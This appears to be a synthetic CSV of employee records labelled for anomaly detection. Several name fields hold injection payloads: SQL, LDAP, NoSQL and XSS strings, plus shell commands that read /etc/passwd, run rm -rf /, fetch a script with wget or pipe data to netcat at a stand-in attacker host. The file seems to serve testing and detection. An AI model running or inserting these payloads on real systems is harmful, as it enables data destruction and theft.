employee_id,name,age,salary,years_experience,department,location,performance_score,projects_completed,days_absent,is_anomaly
EMP01733,Jane Jones,22,72047,6,Operations,Singapore,9.7,13,2,0
EMP01629,Bob Williams,43,69463,12,Engineering,London,7.6,11,4,0
EMP01501,Charlie Jones,50,94840,4,HR,Singapore,6.9,15,4,0
EMP01334,Charlie Brown,42,70116,18,Marketing,San Francisco,10.0,21,0,1
EMP01285,Charlie Williams,22,83600,9,Marketing,Singapore,8.0,8,5,0
EMP01018,Jane Garcia,27,76645,6,HR,Singapore,8.1,9,4,0
EMP01584,Charlie Smith,36,89841,0,Engineering,Tokyo,5.0,12,2,0
EMP01748,John Garcia,30,90321,10,Finance,London,7.3,6,5,0
EMP01083,Alice Smith,30,95883,9,Marketing,San Francisco,6.4,10,7,0
EMP01061,Bob Johnson,33,44685,7,Engineering,London,8.6,11,3,0
EMP01462,Charlie Williams,29,85775,9,Finance,San Francisco,5.8,9,4,0
EMP01291,Diana Brown,31,74255,8,Engineering,San Francisco,7.1,10,5,0
EMP01447,John Johnson,27,59600,7,Marketing,San Francisco,6.2,9,3,0
EMP01182,John Jones,26,55660,1,Finance,Tokyo,7.4,16,7,0
EMP01549,*)(uid=*,30,70504,1,HR,Tokyo,5.1,13,3,1
EMP01500,Charlie Brown,23,61638,30,Engineering,Tokyo,7.4,13,5,1
EMP01223,Jane Garcia,22,117845,5,Engineering,San Francisco,9.6,13,6,0
EMP01424,Bob Garcia,40,71294,0,Sales,New York,7.4,12,4,0
EMP01467,Diana Johnson,41,56921,7,Sales,Singapore,6.2,10,4,0
EMP01319,' UNION SELECT * FROM passwords--,33,96013,6,HR,Singapore,7.7,10,4,1
EMP01328,John Brown,39,73717,12,Operations,Tokyo,6.4,12,7,0
EMP01443,Alice Jones,34,54704,8,HR,Berlin,5.7,19,3,0
EMP01493,Bob Brown,28,91769,3,Sales,Singapore,7.8,21,4,0
EMP01176,Jane Smith,35,65953,5,Sales,London,9.7,12,4,0
EMP01676,Charlie Williams,26,72581,10,Sales,New York,8.7,15,7,0
EMP01363,`cat /etc/passwd`,38,42092,10,Sales,New York,6.6,8,4,1
EMP01163,Diana Jones,28,89180,1,HR,Singapore,7.9,11,8,0
EMP01248,Jane Williams,49,104530,11,Finance,Tokyo,7.5,10,8,0
EMP01518,Charlie Brown,35,62809,0,Marketing,London,7.6,10,9,1
EMP01710,Diana Brown,36,52166,6,Sales,London,5.8,12,5,0
EMP01074,Bob Jones,22,74337,14,HR,San Francisco,8.0,14,6,0
EMP01643,John Garcia,22,49063,1,Engineering,Tokyo,7.8,14,6,0
EMP01405,Charlie Smith,39,75811,8,Sales,Tokyo,4.8,13,5,0
EMP01104,Charlie Johnson,33,78821,9,Operations,London,5.9,14,4,0
EMP01114,Diana Williams,33,73094,5,HR,Singapore,7.3,16,6,0
EMP01300,Alice Brown,28,94960,10,Sales,London,8.1,10,3,0
EMP01092,Charlie Johnson,29,96333,11,Operations,Tokyo,6.8,9,8,0
EMP01411,Diana Johnson,26,61141,4,Operations,London,6.5,12,4,0
EMP01089,Charlie Smith,39,97174,6,Engineering,San Francisco,4.6,11,5,0
EMP01528,*)(uid=*,37,50806,10,Sales,San Francisco,9.9,13,7,1
EMP01734,Jane Brown,43,65679,11,Sales,Berlin,7.6,21,5,0
EMP01743,Bob Williams,35,65858,5,Engineering,San Francisco,6.6,11,4,0
EMP01575,Bob Smith,22,0,16,Operations,Tokyo,7.7,19,3,1
EMP01497,Jane Jones,33,69194,3,Marketing,San Francisco,10.0,16,8,0
EMP01494,{'$ne': null},47,76636,12,Sales,Tokyo,8.3,11,3,0
EMP01011,Charlie Smith,31,66205,1,Marketing,San Francisco,9.8,14,4,0
EMP01433,Jane Smith,40,126594,10,Marketing,Tokyo,7.1,11,1,1
EMP01043,Diana Garcia,32,82648,9,Marketing,London,8.5,1,2,0
EMP01042,Diana Williams,34,52545,7,Sales,Tokyo,5.6,14,7,0
EMP01167,Jane Smith,50,111018,7,Engineering,Singapore,8.5,9,6,0
EMP01703,Alice Johnson,23,74932,9,Operations,London,9.1,13,7,0
EMP01613,Charlie Brown,25,118300,6,Operations,Singapore,5.4,8,6,0
EMP01412,John Garcia,22,60631,4,Operations,San Francisco,10.0,10,4,0
EMP01178,<script>alert('XSS')</script>,32,43321,6,Marketing,London,7.9,8,8,1
EMP01530,Alice Johnson,40,105615,9,Finance,Berlin,8.8,12,6,0
EMP01539,Charlie Jones,30,15000,2,Marketing,New York,6.9,5,7,1
EMP01177,Charlie Smith,46,40000,7,Marketing,Singapore,9.0,15,5,0
EMP01665,Diana Jones,35,86771,12,Engineering,London,8.0,100,5,0
EMP01766,Jane Johnson,34,76339,5,Operations,Berlin,6.9,20,4,0
EMP01257,Bob Williams,29,98454,6,HR,Berlin,8.8,12,5,0
EMP01765,John Williams,29,69373,14,HR,Singapore,4.9,7,7,0
EMP01543,Diana Williams,46,98812,8,Engineering,San Francisco,7.2,10,7,0
EMP01015,Bob Johnson,30,45288,20,Finance,Berlin,7.9,16,3,0
EMP01003,Jane Johnson,47,65754,4,Marketing,Singapore,7.1,10,3,0
EMP01335,Charlie Brown,33,94281,1,Operations,Tokyo,6.7,12,7,0
EMP01256,Diana Johnson,45,74488,13,Marketing,Berlin,5.9,9,8,0
EMP01580,John Smith,37,88558,7,Finance,New York,7.9,50,3,0
EMP01445,Charlie Smith,40,50521,12,Engineering,London,5.9,11,3,0
EMP01338,Alice Johnson,38,86948,12,HR,Tokyo,9.8,16,6,0
EMP01478,Alice Johnson,59,78840,7,Sales,San Francisco,7.9,15,7,1
EMP01417,Bob Garcia,35,80579,0,Operations,Tokyo,8.1,13,6,0
EMP01638,Charlie Smith,24,84819,6,Sales,San Francisco,6.1,15,6,0
EMP01714,Charlie Smith,18,73346,10,Finance,Tokyo,8.1,15,5,0
EMP01324,Jane Johnson,26,107668,16,HR,New York,10.0,18,5,0
EMP01457,Alice Garcia,26,83380,11,Engineering,Berlin,7.2,14,5,0
EMP01009,John Johnson,39,198340,0,Operations,Singapore,5.8,50,4,1
EMP01249,<script>alert('XSS')</script>,38,102601,9,Marketing,London,8.9,100,6,1
EMP01022,John Smith,35,120977,11,Operations,New York,7.2,21,4,0
EMP01221,Alice Smith,22,63525,8,HR,Berlin,8.7,19,8,0
EMP01547,Charlie Jones,33,93686,4,Operations,San Francisco,4.0,9,6,0
EMP01690,Diana Johnson,32,63962,14,HR,San Francisco,4.8,9,90,1
EMP01784,Diana Garcia,39,83576,8,Sales,Tokyo,6.3,9,6,0
EMP01626,Diana Johnson,27,116124,13,HR,Singapore,7.8,9,6,0
EMP01340,Charlie Brown,28,69048,9,Operations,San Francisco,8.1,11,4,0
EMP01671,Bob Williams,22,62804,6,HR,London,10.0,14,7,0
EMP01203,Charlie Garcia,43,62061,1,Marketing,Singapore,5.7,11,6,0
EMP01237,Jane Garcia,36,45712,8,Sales,Berlin,8.9,7,9,1
EMP01093,Jane Williams,32,98385,2,HR,Tokyo,9.7,12,6,0
EMP01531,; rm -rf /,22,99375,8,Sales,Berlin,6.8,6,2,1
EMP01362,Bob Jones,34,47208,10,HR,London,8.8,1,7,0
EMP01544,Charlie Williams,22,93991,7,Finance,Berlin,8.0,15,2,0
EMP01284,Diana Williams,52,82638,7,Marketing,New York,8.0,10,3,0
EMP01184,Diana Jones,33,74927,8,Engineering,Singapore,9.1,16,8,0
EMP01649,Alice Williams,40,75425,11,Operations,Tokyo,9.3,18,3,0
EMP01396,Bob Garcia,22,74607,7,Marketing,San Francisco,8.4,13,6,0
EMP01153,Charlie Smith,36,103875,0,Engineering,Singapore,8.1,10,8,0
EMP01075,John Brown,41,110891,6,Marketing,San Francisco,8.6,14,4,0
EMP01453,Bob Smith,39,82481,6,Finance,Berlin,7.8,14,6,0
EMP01695,{'$ne': null},32,115121,10,Sales,San Francisco,9.4,9,5,0
EMP01277,Diana Garcia,30,66437,7,Engineering,London,5.2,1,5,0
EMP01068,admin)(|(password=*)),37,88170,11,Sales,London,8.5,13,6,0
EMP01514,Jane Jones,30,350000,10,Marketing,Singapore,8.5,6,0,1
EMP01188,Diana Williams,28,70580,9,Engineering,London,6.3,13,5,0
EMP01271,John Brown,23,84540,7,Marketing,London,8.4,10,5,0
EMP01236,John Williams,22,50484,3,Engineering,Berlin,7.8,12,3,0
EMP01088,Charlie Johnson,30,86813,9,HR,San Francisco,7.5,13,5,0
EMP01762,Charlie Johnson,55,40000,1,Marketing,Singapore,6.8,12,1,1
EMP01117,<script>alert('XSS')</script>,25,78732,8,HR,Tokyo,4.2,9,4,1
EMP01125,John Smith,52,44536,12,Sales,Tokyo,8.2,11,7,0
EMP01660,admin)(|(password=*)),75,72230,9,Engineering,San Francisco,8.0,9,8,1
EMP01289,Charlie Johnson,30,71073,7,Marketing,Tokyo,8.4,16,2,0
EMP01238,Jane Garcia,29,79489,7,HR,New York,6.0,14,6,0
EMP01000,Diana Smith,38,93765,7,Marketing,San Francisco,6.4,16,4,0
EMP01791,Diana Brown,36,40000,4,HR,Tokyo,8.6,11,10,1
EMP01602,$(wget malicious.sh),41,98714,10,HR,Berlin,6.9,15,8,1
EMP01794,Jane Smith,26,40000,7,Engineering,New York,5.2,15,6,0
EMP01465,Alice Williams,33,46725,5,Marketing,Singapore,7.0,16,1,1
EMP01278,Diana Garcia,35,105015,1,HR,Tokyo,7.6,9,4,0
EMP01624,John Jones,47,54103,5,Sales,Berlin,4.7,12,2,0
EMP01116,Bob Smith,34,87157,9,HR,New York,7.6,12,3,0
EMP01228,John Smith,29,87270,7,Marketing,San Francisco,6.8,14,4,0
EMP01756,Diana Jones,38,93271,6,Operations,San Francisco,5.6,14,5,0
EMP01420,Alice Smith,51,51248,8,Marketing,London,7.1,13,6,0
EMP01434,Alice Brown,47,58926,12,Finance,London,7.1,14,8,0
EMP01274,Diana Brown,27,94925,13,Finance,Berlin,6.0,16,5,0
EMP01318,Diana Garcia,37,79021,7,Sales,Berlin,6.6,10,5,0
EMP01551,Bob Jones,33,40000,14,Operations,San Francisco,8.7,13,4,0
EMP01144,John Johnson,37,111932,4,Engineering,New York,10.0,11,2,0
EMP01648,Alice Smith,33,99765,7,HR,San Francisco,8.1,7,6,0
EMP01735,Bob Williams,38,43105,10,HR,Tokyo,8.2,8,2,0
EMP01726,Diana Brown,35,112691,3,Marketing,San Francisco,4.6,11,7,0
EMP01585,Charlie Brown,36,80985,14,Sales,Singapore,6.1,11,2,0
EMP01369,Alice Garcia,28,92068,12,Engineering,London,7.2,9,3,0
EMP01268,Alice Garcia,31,65645,3,Marketing,London,8.3,9,5,0
EMP01567,Alice Smith,26,56334,2,Marketing,London,6.6,8,5,0
EMP01307,$(wget malicious.sh),30,53931,3,Marketing,Singapore,7.5,5,90,1
EMP01310,Diana Williams,33,71186,14,Engineering,San Francisco,6.3,13,7,0
EMP01451,Bob Garcia,42,91670,4,Sales,San Francisco,8.8,8,4,0
EMP01046,Jane Jones,31,80783,7,Marketing,Berlin,7.9,12,2,0
EMP01349,Bob Garcia,33,58060,7,HR,San Francisco,7.2,12,2,0
EMP01371,Diana Johnson,38,80623,0,Operations,Tokyo,6.4,10,8,0
EMP01523,John Garcia,39,84730,6,HR,New York,7.4,8,5,0
EMP01261,Bob Garcia,34,40000,11,Finance,London,6.2,9,4,0
EMP01195,Charlie Jones,38,69377,4,Operations,Berlin,4.1,11,4,0
EMP01799,Bob Jones,35,0,8,HR,New York,8.2,8,4,1
EMP01672,Jane Brown,32,72319,5,Finance,Tokyo,7.8,8,3,0
EMP01107,<script>alert('XSS')</script>,36,89925,15,Engineering,London,9.4,10,5,1
EMP01059,Diana Brown,42,87658,12,HR,London,8.2,12,9,1
EMP01599,John Williams,38,61862,9,Engineering,Singapore,7.3,7,2,0
EMP01439,Bob Williams,34,107567,0,HR,Berlin,7.3,11,6,0
EMP01100,admin)(|(password=*)),23,82373,9,Operations,Tokyo,8.4,15,3,0
EMP01477,Alice Johnson,37,82866,12,HR,Singapore,6.5,11,7,0
EMP01718,; rm -rf /,32,54516,5,Engineering,Tokyo,9.1,9,8,1
EMP01583,Jane Williams,53,62885,13,Sales,New York,7.9,18,5,1
EMP01737,Diana Jones,42,64345,8,Sales,San Francisco,6.0,6,3,0
EMP01179,Bob Smith,56,90208,5,Operations,Singapore,10.0,12,5,1
EMP01304,Diana Johnson,34,97163,7,HR,San Francisco,7.9,15,5,0
EMP01429,Charlie Brown,22,119210,6,Finance,San Francisco,7.0,11,4,0
EMP01507,Charlie Jones,28,74817,10,Finance,Berlin,5.8,9,7,0
EMP01770,'; DROP TABLE users--,82,90885,7,Operations,New York,6.1,12,5,1
EMP01149,Bob Johnson,37,79866,12,Finance,London,10.0,14,5,0
EMP01124,John Johnson,39,98900,4,Sales,New York,8.9,12,5,0
EMP01634,Charlie Brown,26,152112,1,Finance,London,7.6,14,45,1
EMP01697,John Williams,24,99167,13,Marketing,Singapore,8.4,15,4,0
EMP01185,Charlie Jones,40,51832,2,Finance,London,6.6,13,1,1
EMP01541,John Jones,25,75060,8,Marketing,Berlin,6.8,16,3,0
EMP01050,Diana Garcia,37,62537,10,Engineering,Tokyo,6.1,10,6,0
EMP01487,| nc attacker.com 4444,26,85159,7,Finance,Berlin,9.6,1,5,1
EMP01789,Bob Garcia,22,76722,12,Operations,Berlin,10.0,11,4,0
EMP01485,Diana Brown,23,48375,3,Operations,Tokyo,6.8,5,4,0
EMP01321,Jane Garcia,39,98740,10,HR,Berlin,6.7,11,2,0
EMP01353,| nc attacker.com 4444,33,48538,5,Finance,New York,7.3,12,5,1
EMP01739,$(wget malicious.sh),43,40000,5,Sales,London,7.1,50,1,1
EMP01142,John Brown,22,88004,8,HR,New York,7.2,14,3,0
EMP01370,Diana Brown,35,90178,10,Operations,London,7.2,14,8,0
EMP01141,Diana Smith,45,92449,7,Engineering,Singapore,5.6,6,7,0
EMP01399,Diana Williams,44,102282,5,Finance,Berlin,8.0,16,7,0
EMP01263,John Smith,26,40205,1,Finance,Tokyo,6.1,7,7,0
EMP01320,Bob Johnson,35,97110,0,HR,San Francisco,10.0,13,5,0
EMP01019,Bob Williams,23,96309,12,Finance,New York,5.5,13,6,0
EMP01172,Charlie Brown,34,-100,5,Sales,San Francisco,7.1,12,5,1
EMP01653,; whoami,26,127033,7,Operations,Tokyo,6.3,9,7,1
EMP01312,Jane Smith,41,92401,10,Operations,Singapore,8.2,8,6,0
EMP01390,Diana Smith,27,77107,11,Marketing,New York,8.4,13,5,0
EMP01745,Alice Johnson,29,84375,12,Marketing,Singapore,8.2,12,3,0
EMP01012,Charlie Johnson,36,103939,11,Operations,San Francisco,5.8,13,7,0
EMP01407,Diana Brown,33,350000,4,Finance,New York,6.3,11,9,1
EMP01408,Bob Garcia,35,46947,10,Engineering,San Francisco,8.9,15,3,0
EMP01305,Diana Smith,35,54201,9,Operations,Singapore,9.1,13,6,0
EMP01354,Bob Brown,34,107840,5,Sales,San Francisco,7.4,14,6,0
EMP01025,; whoami,35,104067,12,Finance,London,8.3,5,4,1
EMP01597,Charlie Jones,27,55567,8,HR,New York,5.6,17,6,0
EMP01169,Charlie Smith,28,46384,10,Operations,London,7.1,9,7,0
EMP01038,Alice Brown,24,94686,16,Engineering,London,6.8,18,5,1
EMP01175,Charlie Smith,41,40000,2,Operations,Berlin,5.8,10,60,1
EMP01245,Jane Garcia,32,92673,3,Sales,Berlin,6.3,15,6,0
EMP01298,Bob Jones,41,93326,10,Finance,Tokyo,8.4,12,7,0
EMP01668,Charlie Williams,22,-100,5,Sales,Berlin,7.8,7,4,1
EMP01416,Alice Jones,47,61530,6,HR,San Francisco,8.2,13,6,0
EMP01548,John Garcia,37,500000,7,Finance,Singapore,7.2,8,1,1
EMP01272,Charlie Johnson,44,76536,6,Engineering,Berlin,7.9,14,5,0
EMP01611,Alice Johnson,34,86124,10,Sales,San Francisco,9.5,9,3,0
EMP01154,| nc attacker.com 4444,37,73356,10,Sales,Tokyo,6.2,11,3,1
EMP01126,Alice Smith,27,63821,5,Marketing,New York,8.1,8,3,0
EMP01449,Bob Jones,26,43882,8,HR,San Francisco,6.7,8,5,0
EMP01571,<img src=x onerror=alert(1)>,48,109234,7,Operations,Berlin,7.4,13,4,1
EMP01341,Diana Johnson,36,102514,6,Marketing,London,8.2,11,6,0
EMP01430,Bob Brown,25,63850,11,HR,New York,4.9,11,2,0
EMP01287,Alice Brown,39,79775,9,Finance,Singapore,5.2,7,45,1
EMP01113,Bob Garcia,54,106549,11,Finance,London,7.1,15,6,1
EMP01499,Jane Smith,23,81433,11,Finance,Tokyo,7.9,12,6,0
EMP01173,Charlie Jones,37,61947,8,Finance,Tokyo,7.4,9,5,0
EMP01359,Bob Brown,28,68503,8,Marketing,Tokyo,8.4,11,3,0
EMP01482,John Smith,22,89162,2,Finance,San Francisco,6.6,12,7,0
EMP01057,Charlie Garcia,32,15000,13,HR,London,7.9,7,3,1
EMP01552,Diana Brown,44,85829,8,Engineering,Berlin,8.2,12,3,0
EMP01222,John Williams,40,74512,7,Sales,New York,7.6,10,5,0
EMP01280,Bob Smith,35,68026,11,Engineering,Singapore,8.5,13,4,0
EMP01017,Alice Smith,82,92792,4,Finance,London,8.0,10,6,1
EMP01127,Charlie Johnson,30,82544,11,Engineering,Singapore,8.4,5,2,0
EMP01322,Diana Smith,28,-5000,3,Finance,San Francisco,5.9,50,3,1
EMP01255,Jane Smith,31,61567,5,Operations,London,8.8,11,8,0
EMP01538,Bob Williams,43,67236,3,Marketing,Tokyo,5.0,15,9,1
EMP01470,Diana Johnson,32,15000,11,HR,Berlin,6.5,19,3,1
EMP01598,Diana Johnson,31,99008,5,HR,San Francisco,8.0,12,4,0
EMP01468,Alice Smith,30,176064,2,Finance,Tokyo,8.3,12,6,1
EMP01768,Jane Smith,29,43749,3,Finance,Singapore,7.4,10,8,0
EMP01190,Bob Johnson,31,79167,0,Marketing,Berlin,9.4,6,2,0
EMP01115,Bob Jones,37,80580,7,Sales,New York,8.0,15,5,0
EMP01516,John Brown,39,53697,7,Engineering,New York,7.2,20,0,1
EMP01709,Diana Garcia,48,104550,11,Finance,London,4.7,14,5,0
EMP01535,Bob Smith,35,68258,5,Marketing,Tokyo,9.7,9,4,0
EMP01094,Jane Jones,31,102643,8,HR,London,5.6,17,3,0
EMP01180,Charlie Johnson,40,90716,2,HR,Singapore,8.1,12,2,0
EMP01301,Bob Brown,30,40000,6,Engineering,Berlin,9.1,8,4,0
EMP01616,Diana Brown,35,76140,6,Marketing,London,5.2,16,7,0
EMP01581,Diana Jones,31,65241,6,Engineering,New York,9.4,24,3,0
EMP01590,Diana Williams,35,84199,1,Finance,Berlin,9.8,14,4,0
EMP01731,Alice Brown,27,40000,7,Operations,Singapore,7.4,4,7,0
EMP01558,Alice Williams,38,45421,13,Operations,Berlin,9.2,15,4,0
EMP01708,Jane Johnson,22,76768,10,Operations,Berlin,8.2,11,45,1
EMP01542,John Brown,82,83738,8,Marketing,Singapore,8.5,14,8,1
EMP01005,Diana Garcia,33,68816,4,Finance,New York,9.5,16,4,0
EMP01785,Charlie Williams,43,88862,4,HR,London,9.5,4,4,0
EMP01045,<img src=x onerror=alert(1)>,29,84849,9,Marketing,New York,7.9,20,4,1
EMP01725,Diana Smith,33,96774,10,Marketing,Singapore,8.6,11,6,0
EMP01157,Jane Brown,38,84135,11,Engineering,New York,7.5,11,4,0
EMP01605,Diana Brown,50,59864,9,Finance,Singapore,5.5,13,4,0
EMP01171,John Smith,25,61378,22,Sales,London,5.3,15,6,0
EMP01016,Bob Jones,26,350000,9,Sales,Singapore,8.3,15,6,1
EMP01511,Jane Williams,34,91355,7,Engineering,New York,8.0,1,6,0
EMP01048,Jane Brown,37,62245,12,HR,San Francisco,6.3,13,5,0
EMP01774,Alice Smith,39,84328,12,Marketing,Tokyo,6.0,14,6,0
EMP01757,John Smith,36,58936,8,Operations,Berlin,7.7,7,8,0
EMP01480,Diana Jones,33,77670,8,Engineering,Singapore,4.1,12,5,0
EMP01283,Diana Smith,25,116534,5,Marketing,London,8.6,5,7,0
EMP01536,Bob Garcia,28,62731,8,HR,Tokyo,6.6,14,90,1
EMP01225,Diana Brown,43,0,9,Operations,Tokyo,6.2,10,5,1
EMP01026,John Garcia,25,106591,6,HR,Berlin,8.4,13,3,0
EMP01630,Alice Jones,22,81148,5,HR,Berlin,4.0,10,4,0
EMP01437,Diana Brown,23,63928,5,Marketing,Berlin,9.9,9,6,0
EMP01364,Charlie Jones,40,95451,10,Operations,New York,7.9,12,5,0
EMP01229,John Garcia,40,54544,8,Sales,Tokyo,6.8,14,5,0
EMP01037,John Brown,22,55032,9,Finance,Berlin,8.7,10,6,0
EMP01779,Bob Williams,39,183791,1,Finance,Berlin,8.3,10,7,1
EMP01374,John Brown,52,59920,7,HR,Singapore,6.8,15,3,0
EMP01469,Diana Jones,30,99721,11,Engineering,Singapore,9.3,8,4,0
EMP01771,Alice Johnson,30,49914,5,Marketing,Berlin,8.4,11,2,0
